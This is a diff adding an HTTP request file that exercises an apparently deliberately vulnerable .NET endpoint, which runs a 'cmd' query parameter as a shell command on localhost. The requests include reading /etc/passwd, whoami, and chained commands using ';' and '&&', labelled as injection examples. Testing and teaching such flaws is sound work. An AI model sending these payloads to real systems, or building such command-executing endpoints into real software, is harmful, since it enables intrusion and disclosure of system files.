@@ -1,0 +1,52 @@
+###
+# NOTE: Adjust the port number (5000) if your .NET Framework app runs on a different port.
+
+###
+# Basic command execution
+GET https://localhost:44351/api/shell-injection/execute?cmd=echo hello world
+
+###
+# List files in current directory (Unix/WSL)
+GET https://localhost:44351/api/shell-injection/execute?cmd=ls -la
+
+###
+# List files in root directory (Unix/WSL)
+GET https://localhost:44351/api/shell-injection/execute?cmd=ls /
+
+###
+# Show current user (Unix/WSL)
+GET https://localhost:44351/api/shell-injection/execute?cmd=whoami
+
+###
+# Attempt to read a sensitive file (Unix/WSL)
+# This might fail depending on permissions
+GET https://localhost:44351/api/shell-injection/execute?cmd=cat /etc/passwd
+
+###
+# Command Chaining (Injection Example 1)
+# Executes 'echo hello' then 'ls'
+GET https://localhost:44351/api/shell-injection/execute?cmd=echo hello; ls
+
+###
+# Command Chaining (Injection Example 2)
+# Executes 'whoami' only if 'echo hello' succeeds
+GET https://localhost:44351/api/shell-injection/execute?cmd=echo hello && whoami
+
+###
+# Command Chaining (Injection Example 3)
+# Executes 'ls' regardless of whether 'invalidcommand' fails
+GET https://localhost:44351/api/shell-injection/execute?cmd=invalidcommand; ls
+
+###
+# Command with spaces and quotes (needs URL encoding)
+# Command: ls "Folder With Spaces"
+GET https://localhost:44351/api/shell-injection/execute?cmd=ls%20%22Folder%20With%20Spaces%22
+
+###
+# Command potentially causing timeout (sleep 15 seconds)
+# Should trigger the 10-second timeout in the controller
+GET https://localhost:44351/api/shell-injection/execute?cmd=sleep 15
+
+###
+# Missing cmd parameter (should return 400 Bad Request)
+GET https://localhost:44351/api/shell-injection/execute
